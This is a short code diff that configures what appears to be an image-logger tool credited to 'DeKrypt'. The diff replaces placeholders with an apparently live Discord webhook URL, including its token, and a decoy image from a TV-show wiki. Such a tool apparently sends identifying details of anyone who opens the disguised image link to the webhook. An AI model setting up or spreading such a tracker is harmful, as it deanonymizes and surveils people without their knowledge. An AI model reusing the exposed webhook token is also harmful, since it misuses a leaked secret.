@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445775585774276639/mumGVvn_yMpXMo5d5yeDaifFk8-v5lqc4_ErZitd54EJfAT9H7Nnr0dU5K2uiygLEdIl",
+    "image": "https://static.wikia.nocookie.net/dexter/images/a/a8/Vince_Masuka_in_Dexter.jpg/revision/latest?cb=20220324010126", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
